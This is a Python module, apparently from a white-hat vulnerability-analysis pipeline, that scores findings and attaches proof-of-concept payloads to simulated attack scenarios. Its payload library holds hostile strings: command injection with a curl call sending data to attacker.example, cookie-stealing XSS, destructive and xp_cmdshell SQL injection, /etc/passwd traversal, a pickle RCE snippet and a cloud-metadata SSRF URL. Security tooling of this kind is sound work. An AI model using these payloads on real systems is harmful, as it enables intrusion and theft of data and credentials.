"""
MISTCODER -- Simulation Engine (MOD-04) v0.1.0
Static scenario simulation + PoC payload generation.
Policy-gated by depth control: LOW / MEDIUM / HIGH.
No real code execution. White-hat research only.
"""

import json
from datetime import datetime, timezone
from typing import Optional

# ── Depth control ─────────────────────────────────────────────────────────────

DEPTH_SEVERITY_FILTER = {
    "LOW":    {"critical"},
    "MEDIUM": {"critical", "high"},
    "HIGH":   {"critical", "high", "medium", "low"},
}

DEPTH_SCENARIO_FILTER = {
    "LOW":    {"RCE", "CREDENTIAL_THEFT"},
    "MEDIUM": {"RCE", "CREDENTIAL_THEFT", "INJECTION", "DATA_EXFIL"},
    "HIGH":   {"RCE", "CREDENTIAL_THEFT", "INJECTION", "DATA_EXFIL", "PRIVESC", "CHAIN"},
}

# ── Category → scenario type ──────────────────────────────────────────────────

CATEGORY_TO_SCENARIO = {
    "DANGEROUS_CALL":    "RCE",
    "COMMAND_INJECTION": "RCE",
    "CODE_EXECUTION":    "RCE",
    "INSECURE_DESERIAL": "RCE",
    "SQL_INJECTION":     "INJECTION",
    "XSS":               "INJECTION",
    "PATH_TRAVERSAL":    "DATA_EXFIL",
    "TAINT_FLOW":        "DATA_EXFIL",
    "EXCEPTION_SWALLOW": "DATA_EXFIL",
    "OPEN_REDIRECT":     "DATA_EXFIL",
    "SSRF":              "DATA_EXFIL",
    "HARDCODED_SECRET":  "CREDENTIAL_THEFT",
    "MISSING_AUTHZ":     "PRIVESC",
    "PRIVILEGE_ESC":     "PRIVESC",
}

# ── PoC payload library ───────────────────────────────────────────────────────

POC_PAYLOADS = {
    "DANGEROUS_CALL": [
        "__import__('os').popen('id').read()",
        "__import__('subprocess').check_output(['whoami'])",
        "compile('import os; os.system(\"id\")', '<str>', 'exec')",
    ],
    "COMMAND_INJECTION": [
        "; id",
        "| cat /etc/passwd",
        "&& curl http://attacker.example/exfil?d=$(whoami)",
        "`id`",
    ],
    "SQL_INJECTION": [
        "' OR '1'='1'--",
        "'; DROP TABLE users;--",
        "' UNION SELECT username,password FROM users--",
        "1; EXEC xp_cmdshell('whoami')--",
    ],
    "XSS": [
        "<script>fetch('https://attacker.example/?c='+document.cookie)</script>",
        "<img src=x onerror=\"this.src='https://attacker.example/?c='+document.cookie\">",
        "javascript:alert(document.domain)",
    ],
    "PATH_TRAVERSAL": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "HARDCODED_SECRET": [
        "[CREDENTIAL EXTRACTION] Plaintext credential identified in source — "
        "no payload required; secret is directly accessible.",
    ],
    "TAINT_FLOW": [
        "[TAINT] Attacker-controlled value reaches privileged sink — "
        "payload depends on sink type (see finding description).",
    ],
    "MISSING_AUTHZ": [
        "[PRIVESC] Privileged route reachable without authorization check — "
        "direct unauthenticated access attempt sufficient.",
    ],
    "INSECURE_DESERIAL": [
        "# Python pickle RCE\n"
        "import pickle, os\n"
        "class E(object):\n"
        "    def __reduce__(self): return (os.system, ('id',))\n"
        "pickle.dumps(E())",
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:6379/",
        "file:///etc/passwd",
    ],
    "DEFAULT": [
        "[INFO] No specific payload template for this category — "
        "manual review recommended.",
    ],
}

# ── Outcome scoring ───────────────────────────────────────────────────────────

SEV_SCORE = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

def _infer_confidence(severity: str) -> float:
    return {"critical": 0.90, "high": 0.75, "medium": 0.55,
            "low": 0.30, "info": 0.10}.get(severity, 0.30)

def _score_outcome(severity: str, confidence: float) -> str:
    s = SEV_SCORE.get(severity, 0)
    if s >= 3 and confidence >= 0.70:
        return "SUCCESS"
    if s >= 2 and confidence >= 0.50:
        return "PARTIAL"
    return "BLOCKED"

OUTCOME_LABEL = {
    "SUCCESS": "Exploit path confirmed — high-confidence breach scenario.",
    "PARTIAL": "Exploit path probable — manual validation required.",
    "BLOCKED": "Insufficient confidence or mitigating controls detected.",
}

IMPACT_MAP = {
    ("RCE",              "SUCCESS"): "Full system compromise — arbitrary code execution confirmed.",
    ("RCE",              "PARTIAL"): "Probable code execution — requires specific runtime conditions.",
    ("RCE",              "BLOCKED"): "Code execution vector present but exploitability unconfirmed.",
    ("INJECTION",        "SUCCESS"): "Data manipulation or extraction confirmed via injection vector.",
    ("INJECTION",        "PARTIAL"): "Injection vector present — partial data access likely.",
    ("INJECTION",        "BLOCKED"): "Injection detected — sanitization may limit exploitability.",
    ("DATA_EXFIL",       "SUCCESS"): "Sensitive data exfiltration path confirmed.",
    ("DATA_EXFIL",       "PARTIAL"): "Partial data exposure — scope depends on access controls.",
    ("DATA_EXFIL",       "BLOCKED"): "Data flow anomaly detected — exfiltration not confirmed.",
    ("CREDENTIAL_THEFT", "SUCCESS"): "Credential compromise confirmed — plaintext secret accessible.",
    ("CREDENTIAL_THEFT", "PARTIAL"): "Credential exposure likely — context-dependent accessibility.",
    ("CREDENTIAL_THEFT", "BLOCKED"): "Credential risk detected — runtime accessibility unconfirmed.",
    ("PRIVESC",          "SUCCESS"): "Privilege escalation confirmed — unauthorized access achievable.",
    ("PRIVESC",          "PARTIAL"): "Escalation possible — depends on execution context.",
    ("PRIVESC",          "BLOCKED"): "Authorization gap detected — escalation not directly confirmed.",
    ("CHAIN",            "SUCCESS"): "Full attack chain simulated — end-to-end breach path confirmed.",
    ("CHAIN",            "PARTIAL"): "Chain partially viable — intermediate steps require validation.",
    ("CHAIN",            "BLOCKED"): "Chain blocked — individual links insufficient to complete breach.",
}

def _get_impact(scenario_type: str, outcome: str) -> str:
    return IMPACT_MAP.get((scenario_type, outcome),
                          "Impact assessment requires manual review.")

def _get_payloads(category: str) -> list:
    return POC_PAYLOADS.get(category, POC_PAYLOADS["DEFAULT"])

# ── Simulate a single finding ─────────────────────────────────────────────────

def _simulate_finding(finding: dict, scenario_type: str, sim_id: str) -> dict:
    severity   = finding.get("severity", "low")
    confidence = finding.get("confidence") or _infer_confidence(severity)
    category   = finding.get("category", "DEFAULT")
    outcome    = _score_outcome(severity, confidence)

    return {
        "id":            sim_id,
        "finding_id":    finding.get("id", "--"),
        "scenario_type": scenario_type,
        "severity":      severity,
        "confidence":    round(confidence, 2),
        "outcome":       outcome,
        "outcome_label": OUTCOME_LABEL[outcome],
        "impact":        _get_impact(scenario_type, outcome),
        "payloads":      _get_payloads(category),
        "line":          finding.get("line", "--"),
        "category":      category,
        "description":   finding.get("description", "--"),
    }

# ── Simulate a vulnerability chain ───────────────────────────────────────────

def _simulate_chain(chain: dict, findings_map: dict, sim_id: str) -> dict:
    severity   = chain.get("combined_severity", "medium")
    confidence = chain.get("confidence", 0.50)
    outcome    = _score_outcome(severity, confidence)
    links      = chain.get("links", [])

    chain_payloads = []
    for fid in links:
        f = findings_map.get(fid)
        if f:
            chain_payloads.extend(_get_payloads(f.get("category", "DEFAULT")))

    return {
        "id":            sim_id,
        "chain_id":      chain.get("id", "--"),
        "scenario_type": "CHAIN",
        "severity":      severity,
        "confidence":    round(confidence, 2),
        "outcome":       outcome,
        "outcome_label": OUTCOME_LABEL[outcome],
        "impact":        _get_impact("CHAIN", outcome),
        "narrative":     chain.get("narrative", "--"),
        "payloads":      chain_payloads[:4],
        "links":         links,
    }

# ── Main simulate() function ──────────────────────────────────────────────────

def simulate(ir: dict,
             analysis_report: dict,
             reasoning_result: Optional[dict] = None,
             depth: str = "MEDIUM") -> dict:
    """
    Run MOD-04 simulation pipeline.

    Parameters
    ----------
    ir               : dict  MOD-01 output
    analysis_report  : dict  MOD-02 output
    reasoning_result : dict  MOD-03 output (optional)
    depth            : str   LOW | MEDIUM | HIGH

    Returns
    -------
    dict  simulation result
    """
    depth = depth.upper()
    if depth not in DEPTH_SEVERITY_FILTER:
        raise ValueError(f"Invalid depth '{depth}'. Choose LOW, MEDIUM, or HIGH.")

    sev_filter      = DEPTH_SEVERITY_FILTER[depth]
    scenario_filter = DEPTH_SCENARIO_FILTER[depth]

    findings     = analysis_report.get("findings", [])
    findings_map = {f.get("id"): f for f in findings}
    chains       = (reasoning_result or {}).get("chains", [])

    simulations = []
    counter     = 1

    for finding in findings:
        sev           = finding.get("severity", "low")
        category      = finding.get("category", "DEFAULT")
        scenario_type = CATEGORY_TO_SCENARIO.get(category, "DATA_EXFIL")

        if sev not in sev_filter:
            continue
        if scenario_type not in scenario_filter:
            continue

        simulations.append(
            _simulate_finding(finding, scenario_type, f"SIM-{counter:04d}")
        )
        counter += 1

    if "CHAIN" in scenario_filter and reasoning_result:
        for chain in chains:
            if chain.get("combined_severity", "medium") not in sev_filter:
                continue
            simulations.append(
                _simulate_chain(chain, findings_map, f"SIM-{counter:04d}")
            )
            counter += 1

    success = sum(1 for s in simulations if s["outcome"] == "SUCCESS")
    partial = sum(1 for s in simulations if s["outcome"] == "PARTIAL")
    blocked = sum(1 for s in simulations if s["outcome"] == "BLOCKED")

    return {
        "simulations": simulations,
        "summary": {
            "total":         len(simulations),
            "success":       success,
            "partial":       partial,
            "blocked":       blocked,
            "depth":         depth,
        },
        "metadata": {
            "simulator":     "SimulationEngine v0.1.0",
            "depth":         depth,
            "simulated_at":  datetime.now(timezone.utc).isoformat(),
            "finding_count": len(findings),
            "chain_count":   len(chains),
        },
    }


class SimulationEngine:
    """MOD-04 entry point — class interface for pipeline integration."""

    def __init__(self, depth: str = "MEDIUM"):
        self.depth = depth.upper()

    def simulate(self, ir: dict,
                 analysis_report: dict,
                 reasoning_result: Optional[dict] = None) -> dict:
        result = simulate(ir, analysis_report, reasoning_result, self.depth)
        s = result["summary"]
        print(f"[MOD-04] Simulation complete | depth={self.depth} | "
              f"total={s['total']} success={s['success']} "
              f"partial={s['partial']} blocked={s['blocked']}")
        return result

    def simulate_from_json_files(self,
                                 ir_path: str,
                                 analysis_path: str,
                                 reasoning_path: Optional[str] = None) -> dict:
        with open(ir_path, "r", encoding="utf-8") as f:
            ir = json.load(f)
        with open(analysis_path, "r", encoding="utf-8") as f:
            analysis_report = json.load(f)
        reasoning_result = None
        if reasoning_path:
            with open(reasoning_path, "r", encoding="utf-8") as f:
                reasoning_result = json.load(f)
        return self.simulate(ir, analysis_report, reasoning_result)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python simulation_engine.py <ir.json> <analysis.json> "
              "[reasoning.json] [--depth LOW|MEDIUM|HIGH]")
        sys.exit(1)

    ir_p  = sys.argv[1]
    ana_p = sys.argv[2]
    rea_p = None
    depth = "MEDIUM"

    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "--depth" and i + 1 < len(sys.argv):
            depth = sys.argv[i + 1]; i += 2
        elif not sys.argv[i].startswith("--"):
            rea_p = sys.argv[i]; i += 1
        else:
            i += 1

    engine = SimulationEngine(depth=depth)
    result = engine.simulate_from_json_files(ir_p, ana_p, rea_p)
    print(json.dumps(result, indent=2))
